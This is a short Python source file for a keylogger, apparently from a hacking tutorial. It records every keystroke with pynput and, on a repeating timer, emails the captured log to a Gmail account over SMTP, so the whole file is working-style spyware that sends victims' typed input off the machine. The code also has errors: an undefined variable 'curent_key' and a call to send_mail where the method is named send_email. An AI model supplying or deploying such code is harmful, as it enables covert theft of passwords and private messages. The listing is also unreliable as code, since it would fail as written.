#!/usr/bin/env python3

import pynput.keyboard # module to record help record key input
import threading
import smtplib # allows to send email via python

class Keylogger:

	def __init__(self, time_interval, email, password):
		self.log = "[+] Keylogger started ..."
		self.interval = time_interval
		self.email = email
		self.password = password

	def append_to_log(self, string):
		self.log += string

	def process_key_press(self, key):
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:	
				current_key = " "
			else:
				current_key = " " + str(key) + " "
		self.append_to_log(curent_key)

	def report(self):
		self.send_mail(self.email, self.password, "\n\n" + self.log)
		self.log = ""
		timer = threading.Timer(self.interval, self.report) # wait 5 seconds, then call 'report' function again while user input is getting logged
		timer.start()

	def send_email(self, email, password, message):
		server = smtplib.SMTP("smtp.gmail.com", 587) # instance of an SMTP server
		server.starttls() # initiate TLS connection
		server.login(email, password) # login to email
		server.sendmail(email, email, message) # send email
		server.quit() # close connection
    
	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press) # on_press is callback function
		with keyboard_listener:
			self.report()
			keyboard_listener.join()
